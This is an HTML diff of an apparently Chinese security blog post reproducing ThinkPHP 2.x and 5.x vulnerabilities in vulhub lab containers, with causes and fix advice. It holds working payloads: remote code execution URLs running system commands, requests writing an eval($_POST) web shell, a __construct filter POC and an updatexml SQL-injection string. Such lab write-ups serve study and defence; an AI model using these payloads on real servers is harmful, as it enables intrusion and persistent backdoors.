@@ -1,0 +1,209 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>ThinkPHP漏洞总结复现 | 1ance's blog</title><meta name="keywords" content="漏洞,thinkphp,框架"><meta name="author" content="1ance"><meta name="copyright" content="1ance"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="简介 &amp;ensp;&amp;ensp;ThinkPHP是为了简化企业级应用开发和敏捷WEB应用开发而诞生的，是一个快速、兼容而且简单的轻量级国产PHP开发框架，诞生于2006年初，原名FCS，2007年元旦正式更名为ThinkPHP，遵循Apache2开源协议发布，从Struts结构移植过来并做了改进和完善，同时也借鉴了国外很多优秀的框架和模式，使用面向对象的开发结构和MVC模式，融合了Struts的思想">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ThinkPHP漏洞总结复现">
+<meta property="og:url" content="https://blog.1ance.xyz/2021/09/07/ThinkPHP%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="1ance&#39;s blog">
+<meta property="og:description" content="简介 &amp;ensp;&amp;ensp;ThinkPHP是为了简化企业级应用开发和敏捷WEB应用开发而诞生的，是一个快速、兼容而且简单的轻量级国产PHP开发框架，诞生于2006年初，原名FCS，2007年元旦正式更名为ThinkPHP，遵循Apache2开源协议发布，从Struts结构移植过来并做了改进和完善，同时也借鉴了国外很多优秀的框架和模式，使用面向对象的开发结构和MVC模式，融合了Struts的思想">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.1ance.xyz/2021/09/07/ThinkPHP%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/thinkphp.jpg">
+<meta property="article:published_time" content="2021-09-07T05:47:36.000Z">
+<meta property="article:modified_time" content="2021-09-26T15:23:45.048Z">
+<meta property="article:author" content="1ance">
+<meta property="article:tag" content="漏洞">
+<meta property="article:tag" content="thinkphp">
+<meta property="article:tag" content="框架">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.1ance.xyz/2021/09/07/ThinkPHP%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/thinkphp.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://blog.1ance.xyz/2021/09/07/ThinkPHP%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ThinkPHP漏洞总结复现',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-09-26 23:23:45'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const fontSizeVal = saveToLocal.get('global-font-size')
+    if (fontSizeVal !== undefined) {
+      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
+    }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/header.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">24</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">1ance's blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">ThinkPHP漏洞总结复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-09-07T05:47:36.000Z" title="发表于 2021-09-07 13:47:36">2021-09-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-09-26T15:23:45.048Z" title="更新于 2021-09-26 23:23:45">2021-09-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>5分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ThinkPHP漏洞总结复现"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div><article class="post-content" id="article-container"><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote>
+<p>&ensp;&ensp;ThinkPHP是为了简化企业级应用开发和敏捷WEB应用开发而诞生的，是一个快速、兼容而且简单的轻量级国产PHP开发框架，诞生于2006年初，原名FCS，2007年元旦正式更名为ThinkPHP，遵循Apache2开源协议发布，从Struts结构移植过来并做了改进和完善，同时也借鉴了国外很多优秀的框架和模式，使用面向对象的开发结构和MVC模式，融合了Struts的思想和TagLib（标签库）、RoR的ORM映射和ActiveRecord模式。<br>&ensp;&ensp;ThinkPHP可以支持windows/Unix/Linux等服务器环境，正式版需要PHP5.0以上版本支持，支持MySql、PgSQL、Sqlite多种数据库以及PDO扩展，是一款跨平台，跨版本以及简单易用的PHP框架。</p>
+</blockquote>
+<h1 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h1><h2 id="Thinkphp-2-x-任意代码执行漏洞"><a href="#Thinkphp-2-x-任意代码执行漏洞" class="headerlink" title="Thinkphp 2.x 任意代码执行漏洞"></a>Thinkphp 2.x 任意代码执行漏洞</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>ThinkPHP 2.x版本中，使用preg_replace的/e模式匹配路由：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$depr</span> = <span class="string">&#x27;\/&#x27;</span>;</span><br><span class="line"><span class="variable">$paths</span> = explode(<span class="variable">$depr</span>,trim(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>],<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line"><span class="variable">$res</span> = preg_replace(<span class="string">&#x27;@(\w+)&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;([^&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;\/]+)@e&#x27;</span>, <span class="string">&#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;</span>, implode(<span class="variable">$depr</span>,<span class="variable">$paths</span>));</span><br></pre></td></tr></table></figure>
+<p><code>explode函数</code>是把通过<code>/</code>把url参数拆开，然后再用<code>implode函数</code>通过<code>\/</code>拼接起来，然后带入<code>preg_replace函数</code>里面。<code>preg_replace函数</code>的/e模式，和php双引号都能能解析变量，代码执行。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">正则表达式：<span class="string">&#x27;@(\w+)&#x27;</span>.\<span class="variable">$depr</span>.<span class="string">&#x27;([^&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;\/]+)@e&#x27;</span></span><br><span class="line">简化后是</span><br><span class="line">正则表达式是：/(\w+)\/([^\/\/]+)/e</span><br><span class="line"> \w+表示匹配任意长的`[字母数字下划线]`字符串，然后匹配 `/ `符号，再匹配除了` / `符号以外的字符，匹配连续的两个参数。</span><br><span class="line"></span><br><span class="line"><span class="variable">$var</span>[\<span class="string">&#x27;\\1\&#x27;]=&quot;\\2&quot;;</span></span><br><span class="line"><span class="string">\\1是取匹配正则的字符串的第一个匹配结果，\\2是取第二个匹配结果。</span></span><br><span class="line"><span class="string">一个被当成键名，一个被当成键值，传进了var数组里面。</span></span><br></pre></td></tr></table></figure>
+
+<p>举例说明： </p>
+<blockquote>
+<p>URL：<a target="_blank" rel="noopener" href="http://www.baidu.com/index.php?s=1/2/3/4">www.baidu.com/index.php?s=1/2/3/4</a><br>每次匹配1和2 、 3和4 、 5和6。<br>然后，也就是\\1 取的是 1 3 5，\\2 取的是 2 4 6。<br>那么就是连续的两个参数，一个被当成键名，一个被当成键值，传进了var数组里面。而双引号是存在在 \2 外面的，那么就说明我们要控制的是偶数位的参数。</p>
+</blockquote>
+<h3 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h3><p>环境：vulhub</p>
+<blockquote>
+<p>docker-compose up  //一键启动</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/1bdc86c306ec4bd3a4ff532f916053f8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAMWFuY2Uu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>访问环境：<br><img src="https://img-blog.csdnimg.cn/675351201a3749258a9637b25def66ba.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAMWFuY2Uu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>POC：<code>http://192.168.255.128:8080/index.php?s=1/2/3/$&#123;phpinfo()&#125;</code><br><img src="https://img-blog.csdnimg.cn/4c6768ca940f43a484ff7875eb153882.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAMWFuY2Uu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<p>getshell payload: <code>http://192.168.255.128:8080/index.php?s=1/2/3/$&#123;@print(eval($_POST[1]))&#125;</code><br><img src="https://img-blog.csdnimg.cn/bc6b9d8fbc43404a962b27e810e64b41.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAMWFuY2Uu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>上蚁剑：<br><img src="https://img-blog.csdnimg.cn/ba879d9ff00344949414506eb45d4001.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAMWFuY2Uu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<h3 id="修复意见"><a href="#修复意见" class="headerlink" title="修复意见"></a>修复意见</h3><blockquote>
+<p>1、下载官方补丁<br><a target="_blank" rel="noopener" href="http://code.google.com/p/thinkphp/source/detail?spec=svn2904&amp;r=2838">http://code.google.com/p/thinkphp/source/detail?spec=svn2904&amp;r=2838</a><br>2、修改/ThinkPHP/Lib/Core/Dispatcher.class.php文件<br>将preg_replace第二个参数中的双引号改为单引号，防止其中的php变量语法被解析执行；</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span> = preg_replace(<span class="string">&#x27;@(w+)&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;([^&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;/]+)@e&#x27;</span>, <span class="string">&#x27;$var[\&#x27;\\1\&#x27;]=&#x27;</span>\\<span class="number">2</span><span class="string">&#x27;;&#x27;</span>, implode(<span class="variable">$depr</span>,<span class="variable">$paths</span>));</span><br></pre></td></tr></table></figure>
+<h2 id="Thinkphp5-5-0-22-5-1-29远程执行代码漏洞"><a href="#Thinkphp5-5-0-22-5-1-29远程执行代码漏洞" class="headerlink" title="Thinkphp5-5.0.22/5.1.29远程执行代码漏洞"></a>Thinkphp5-5.0.22/5.1.29远程执行代码漏洞</h2><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>ThinkPHP版本5中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。<br>详细分析：<a target="_blank" rel="noopener" href="https://paper.seebug.org/760/">ThinkPHP5 远程代码执行漏洞分析</a></p>
+<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><blockquote>
+<p>ThinkPHP 5.0.x &lt; 5.0.23<br>ThinkPHP 5.1.x &lt; 5.1.31</p>
+</blockquote>
+<h3 id="复现过程-1"><a href="#复现过程-1" class="headerlink" title="复现过程"></a>复现过程</h3><p>环境：vulhub<br><img src="https://img-blog.csdnimg.cn/b04a2b3798c34e9cb001280eaec66398.png" alt="在这里插入图片描述"><br>访问地址：<br><img src="https://img-blog.csdnimg.cn/93947ce3ef3c43a6b04d6a19e151e674.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAMWFuY2Uu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>POC：<br><code>http://192.168.255.128:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</code><br><img src="https://img-blog.csdnimg.cn/5ed07ffa799045909e1cd593ffda71b4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAMWFuY2Uu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>任意代码执行：<code>http://192.168.255.128:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</code><br><img src="https://img-blog.csdnimg.cn/a494b6288d944069b9f2fd4f3c730254.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAMWFuY2Uu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>getshell：<code>http://192.168.255.128:8080/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=1.php&amp;vars[1][]=&lt;?php eval($_POST[1]);?&gt;</code><br><img src="https://img-blog.csdnimg.cn/00e65f9f8dfc41669ef2e843471aa81a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAMWFuY2Uu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/5cb9f2a26ba640dcbda926a2627c908b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAMWFuY2Uu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>上蚁剑：<br><img src="https://img-blog.csdnimg.cn/8307f2660bb34e4ba9aac1a07be2f1f3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAMWFuY2Uu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<h3 id="修复意见-1"><a href="#修复意见-1" class="headerlink" title="修复意见"></a>修复意见</h3><blockquote>
+<p>1、将版本升至5.0.23及以上；5.1.31及以上。</p>
+</blockquote>
+<p>5.0版本在think\App类的module方法的获取控制器的代码后面加上</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/^[A-Za-z](\w|\.)*$/&#x27;</span>, <span class="variable">$controller</span>)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">&#x27;controller not exists:&#x27;</span> . <span class="variable">$controller</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>5.1版本在think\route\dispatch\Url类的parseUrl方法，解析控制器后加上</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$controller</span> &amp;&amp; !preg_match(<span class="string">&#x27;/^[A-Za-z](\w|\.)*$/&#x27;</span>, <span class="variable">$controller</span>)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">&#x27;controller not exists:&#x27;</span> . <span class="variable">$controller</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Thinkphp5-0-23远程代码执行漏洞"><a href="#Thinkphp5-0-23远程代码执行漏洞" class="headerlink" title="Thinkphp5.0.23远程代码执行漏洞"></a>Thinkphp5.0.23远程代码执行漏洞</h2><h3 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Thinkphp5.0.23以前的版本中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。</p>
+<h3 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h3><blockquote>
+<p>Thinkphp 5.0.0~ 5.0.23</p>
+</blockquote>
+<h3 id="复现过程-2"><a href="#复现过程-2" class="headerlink" title="复现过程"></a>复现过程</h3><p>环境：vulhub<br><img src="https://img-blog.csdnimg.cn/ef2e293f7f694cdc832b969a6ecad70f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAMWFuY2Uu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>访问地址：<br><img src="https://img-blog.csdnimg.cn/6b27a921e4b5496799185e4a90cae05e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAMWFuY2Uu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>POC：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?s=captcha HTTP/1.1</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id</span><br></pre></td></tr></table></figure>
+<p>Burp抓包，改包。<br><img src="https://img-blog.csdnimg.cn/1cb731f144874b679917dd5fd9d92d0e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAMWFuY2Uu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/76f2fe09930b487ba97dfad6025f8412.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAMWFuY2Uu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/e2888f1e747b49459210f91d95d8f82e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAMWFuY2Uu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<h3 id="修复意见-2"><a href="#修复意见-2" class="headerlink" title="修复意见"></a>修复意见</h3><blockquote>
+<p>1、升级代码到最新版本5.0.24及以上；</p>
+</blockquote>
+<h2 id="Thinkphp5-SQL注入漏洞和敏感信息泄露漏洞"><a href="#Thinkphp5-SQL注入漏洞和敏感信息泄露漏洞" class="headerlink" title="Thinkphp5 SQL注入漏洞和敏感信息泄露漏洞"></a>Thinkphp5 SQL注入漏洞和敏感信息泄露漏洞</h2><h3 id="漏洞原理-3"><a href="#漏洞原理-3" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>传入的某参数在绑定编译指令的时候又没有安全处理，预编译的时候导致SQL异常报错。然而thinkphp5默认开启debug模式，在漏洞环境下构造错误的SQL语法会泄漏数据库账户和密码。</p>
+<h3 id="影响范围-2"><a href="#影响范围-2" class="headerlink" title="影响范围"></a>影响范围</h3><blockquote>
+<p>ThinkPHP &lt; 5.1.23</p>
+</blockquote>
+<h3 id="复现过程-3"><a href="#复现过程-3" class="headerlink" title="复现过程"></a>复现过程</h3><p>环境：vulhub<br><img src="https://img-blog.csdnimg.cn/63ab77b3f28045f0a988f9da66f7a01f.png" alt="在这里插入图片描述"><br>访问地址，环境成功运行：<br><img src="https://img-blog.csdnimg.cn/35c0c2c95c454c8fa6d9ee820870760a.png" alt="在这里插入图片描述"><br>POC：<code>http://192.168.255.128:8080/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1</code><br><img src="https://img-blog.csdnimg.cn/6f89b2ac5f594f55944839ce2baea4ee.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAMWFuY2Uu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<h3 id="修复意见-3"><a href="#修复意见-3" class="headerlink" title="修复意见"></a>修复意见</h3><blockquote>
+<p>1、在拼接字符串前对变量进行检查，看是否存在 )、# 两个符号。<br>2、升级版本至最新。</p>
+</blockquote>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">1ance</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://blog.1ance.xyz/2021/09/07/ThinkPHP%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/">https://blog.1ance.xyz/2021/09/07/ThinkPHP%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.1ance.xyz" target="_blank">1ance's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E/">漏洞</a><a class="post-meta__tags" href="/tags/thinkphp/">thinkphp</a><a class="post-meta__tags" href="/tags/%E6%A1%86%E6%9E%B6/">框架</a></div><div class="post_share"><div class="social-share" data-image="/2021/09/07/ThinkPHP%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%A4%8D%E7%8E%B0/thinkphp.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div 